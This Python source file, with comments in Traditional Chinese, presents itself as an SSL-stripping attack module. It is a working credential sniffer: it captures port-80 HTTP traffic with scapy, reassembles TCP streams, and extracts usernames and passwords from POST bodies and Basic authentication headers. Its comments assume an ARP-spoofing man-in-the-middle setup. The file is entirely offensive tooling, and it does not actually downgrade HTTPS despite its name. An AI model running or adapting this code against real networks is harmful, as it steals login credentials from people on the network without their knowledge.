#!/usr/bin/env python3
"""
SSL剝離攻擊模組
將HTTPS連線降級為HTTP，以便捕獲明文密碼
"""

from scapy.all import sniff, IP, TCP, Raw, get_if_list
import re
import threading
import time
import urllib.parse

class SSLStripper:
    def __init__(self):
        """初始化SSL剝離器"""
        self.stripping = False
        self.captured_credentials = []
        self.capture_thread = None
        self.interface = None
        self.packet_count = 0
        self.last_packet_time = None
    
    def _capture_packets(self, interface=None):
        """捕獲資料包並進行SSL剝離分析"""
        # 用於重組TCP流的字典
        tcp_streams = {}
        
        def process_packet(packet):
            if not self.stripping:
                return
            
            try:
                # 更新統計
                self.packet_count += 1
                self.last_packet_time = time.time()
                
                # 每1000個資料包輸出一次狀態
                if self.packet_count % 1000 == 0:
                    print(f"[*] 已處理 {self.packet_count} 個資料包...")
                
                if not (packet.haslayer(IP) and packet.haslayer(TCP)):
                    return
                
                # 處理TCP資料包
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                src_port = packet[TCP].sport
                dst_port = packet[TCP].dport
                
                # 每100個資料包輸出一次詳細資訊（用於調試）
                if self.packet_count % 100 == 0 and self.packet_count > 0:
                    print(f"[DEBUG] TCP流量: {src_ip}:{src_port} -> {dst_ip}:{dst_port} (端口80: {dst_port == 80 or src_port == 80})")
                
                # 只處理包含資料的資料包（有Raw層）
                if not packet.haslayer(Raw):
                    return
                
                # 建立流標識符
                stream_id = f"{src_ip}:{src_port}->{dst_ip}:{dst_port}"
                
                # 處理包含資料的資料包
                load = packet[Raw].load
                
                # 快速檢查是否可能是HTTP資料
                try:
                    load_str = load.decode('utf-8', errors='ignore')
                    # 每50個有資料的資料包輸出一次（用於調試）
                    if self.packet_count % 50 == 0 and ('POST' in load_str or 'GET' in load_str or 'HTTP' in load_str):
                        print(f"[DEBUG] 檢測到HTTP資料包: {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
                except:
                    pass
                
                # 嘗試重組TCP流
                if stream_id not in tcp_streams:
                    tcp_streams[stream_id] = b''
                
                tcp_streams[stream_id] += load
                
                # 檢查是否包含完整的HTTP請求
                try:
                    full_data = tcp_streams[stream_id].decode('utf-8', errors='ignore')
                    
                    # 檢查是否包含HTTP請求結束標記
                    if '\r\n\r\n' in full_data or len(tcp_streams[stream_id]) > 4096:
                        # 調試輸出：顯示檢測到的HTTP請求
                        if 'POST' in full_data:
                            print(f"[DEBUG] 檢測到POST請求 (長度: {len(full_data)})")
                            if 'password' in full_data.lower() or 'login' in full_data.lower():
                                print(f"[DEBUG] POST請求包含登入相關欄位")
                        
                        # 捕獲POST請求中的憑證
                        if 'POST' in full_data and ('password' in full_data.lower() or 'login' in full_data.lower() or 'passwd' in full_data.lower()):
                            print(f"[+] 嘗試提取憑證...")
                            self._extract_credentials(full_data, packet)
                        
                        # 捕獲HTTP基本認證
                        if 'Authorization:' in full_data and 'Basic' in full_data:
                            print(f"[+] 嘗試提取基本認證...")
                            self._extract_basic_auth(full_data, packet)
                        
                        # 清理已處理的流（保留最近的一些）
                        if len(tcp_streams) > 100:
                            oldest = min(tcp_streams.keys(), key=lambda k: len(tcp_streams[k]))
                            del tcp_streams[oldest]
                except Exception as decode_error:
                    # 如果解碼失敗，嘗試直接處理單個資料包
                    try:
                        load_str = load.decode('utf-8', errors='ignore')
                        if 'POST' in load_str and ('password' in load_str.lower() or 'login' in load_str.lower()):
                            print(f"[DEBUG] 直接處理單個資料包中的POST請求")
                            self._extract_credentials(load_str, packet)
                    except:
                        pass
            except Exception as e:
                # 輸出錯誤以便調試
                if self.stripping:  # 只在運行時輸出
                    print(f"[!] 處理資料包錯誤: {e}")
        
        try:
            # 使用BPF過濾器只捕獲HTTP流量（端口80）
            # 注意：在ARP欺騙環境中，我們需要捕獲雙向流量
            bpf_filter = "tcp port 80"
            
            print(f"[*] 開始捕獲HTTP流量")
            print(f"[*] 過濾器: {bpf_filter}")
            if interface:
                print(f"[*] 使用網路介面: {interface}")
            print(f"[*] 提示: 確保目標正在使用HTTP（不是HTTPS）進行登入")
            print(f"[*] 提示: 如果沒有看到資料包，請檢查是否有HTTP流量經過此介面")
            
            if interface:
                sniff(iface=interface, filter=bpf_filter, prn=process_packet, 
                      stop_filter=lambda x: not self.stripping, store=False)
            else:
                sniff(filter=bpf_filter, prn=process_packet, 
                      stop_filter=lambda x: not self.stripping, store=False)
        except PermissionError:
            print("[!] 權限錯誤: 需要root權限來捕獲網路流量")
            print("[!] 請使用: sudo python3 main.py")
            self.stripping = False
        except OSError as e:
            if "No such device" in str(e) or "Device not found" in str(e):
                print(f"[!] 網路介面錯誤: {interface} 不存在")
                print("[*] 可用的介面:")
                try:
                    from scapy.all import get_if_list
                    for iface in get_if_list():
                        print(f"  - {iface}")
                except:
                    pass
                self.stripping = False
            else:
                print(f"[!] SSL剝離捕獲錯誤: {e}")
                self.stripping = False
        except Exception as e:
            print(f"[!] SSL剝離捕獲錯誤: {e}")
            import traceback
            traceback.print_exc()
            self.stripping = False
    
    def _extract_credentials(self, data, packet):
        """從HTTP POST資料中提取憑證"""
        try:
            # 提取URL編碼的資料
            if '\r\n\r\n' in data:
                body = data.split('\r\n\r\n', 1)[1]
            else:
                body = data
            
            # 嘗試解析URL編碼的資料
            try:
                parsed = urllib.parse.parse_qs(body)
                username = None
                password = None
                
                for key in ['user', 'username', 'email', 'login', 'userid', 'account']:
                    if key in parsed:
                        username = parsed[key][0] if parsed[key] else "N/A"
                        break
                
                for key in ['password', 'passwd', 'pass', 'pwd']:
                    if key in parsed:
                        password = parsed[key][0] if parsed[key] else "N/A"
                        break
                
                if username or password:
                    credential = {
                        'username': username or "N/A",
                        'password': password or "N/A",
                        'source_ip': packet[IP].src if packet.haslayer(IP) else "Unknown",
                        'dest_ip': packet[IP].dst if packet.haslayer(IP) else "Unknown",
                        'timestamp': time.time()
                    }
                    
                    # 避免重複添加相同的憑證
                    if credential not in self.captured_credentials:
                        self.captured_credentials.append(credential)
                        print(f"[+] 捕獲到憑證: {credential['username']} / {credential['password']} (來源: {credential['source_ip']})")
            except:
                # 如果解析失敗，使用正則表達式
                username_match = re.search(r'(?:user|username|email|login|userid|account)=([^&\s\r\n]+)', data, re.IGNORECASE)
                password_match = re.search(r'(?:password|passwd|pass|pwd)=([^&\s\r\n]+)', data, re.IGNORECASE)
                
                if username_match or password_match:
                    username = urllib.parse.unquote(username_match.group(1)) if username_match else "N/A"
                    password = urllib.parse.unquote(password_match.group(1)) if password_match else "N/A"
                    
                    credential = {
                        'username': username,
                        'password': password,
                        'source_ip': packet[IP].src if packet.haslayer(IP) else "Unknown",
                        'dest_ip': packet[IP].dst if packet.haslayer(IP) else "Unknown",
                        'timestamp': time.time()
                    }
                    
                    if credential not in self.captured_credentials:
                        self.captured_credentials.append(credential)
                        print(f"[+] 捕獲到憑證: {username} / {password} (來源: {credential['source_ip']})")
        except Exception as e:
            pass
    
    def _extract_basic_auth(self, data, packet):
        """提取HTTP基本認證"""
        try:
            import base64
            auth_match = re.search(r'Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)', data, re.IGNORECASE)
            if auth_match:
                encoded = auth_match.group(1)
                decoded = base64.b64decode(encoded).decode('utf-8', errors='ignore')
                if ':' in decoded:
                    username, password = decoded.split(':', 1)
                    credential = {
                        'username': username,
                        'password': password,
                        'source_ip': packet[IP].src if packet.haslayer(IP) else "Unknown",
                        'dest_ip': packet[IP].dst if packet.haslayer(IP) else "Unknown",
                        'timestamp': time.time()
                    }
                    
                    if credential not in self.captured_credentials:
                        self.captured_credentials.append(credential)
                        print(f"[+] 捕獲到基本認證: {username} / {password}")
        except Exception as e:
            pass
    
    def start(self, interface=None):
        """
        開始SSL剝離
        
        Args:
            interface: 網路介面（可選）
        """
        if self.stripping:
            return False
        
        try:
            # 如果沒有指定介面，嘗試獲取預設介面
            if not interface:
                interfaces = get_if_list()
                non_loopback = [iface for iface in interfaces if not iface.startswith('lo')]
                if non_loopback:
                    interface = non_loopback[0]
                else:
                    interface = None
            
            self.interface = interface
            self.stripping = True
            self.captured_credentials = []  # 重置捕獲的憑證
            self.packet_count = 0  # 重置計數器
            
            # 在背景執行緒中執行捕獲
            self.capture_thread = threading.Thread(target=self._capture_packets, args=(interface,), daemon=True)
            self.capture_thread.start()
            
            if interface:
                print(f"[+] SSL剝離已啟動 (介面: {interface})")
            else:
                print(f"[+] SSL剝離已啟動 (所有介面)")
            print("[*] 正在監聽HTTP流量以捕獲憑證...")
            
            return True
        except Exception as e:
            print(f"[!] 啟動SSL剝離錯誤: {e}")
            self.stripping = False
            return False
    
    def stop(self):
        """停止SSL剝離"""
        if not self.stripping:
            return False
        
        try:
            self.stripping = False
            if self.capture_thread:
                self.capture_thread.join(timeout=2)
            
            print("[+] SSL剝離已停止")
            print(f"[*] 總共處理 {self.packet_count} 個資料包")
            print(f"[*] 總共捕獲 {len(self.captured_credentials)} 組憑證")
            return True
        except Exception as e:
            print(f"[!] 停止SSL剝離錯誤: {e}")
            return False
    
    def get_captured_credentials(self):
        """獲取捕獲的憑證"""
        return self.captured_credentials

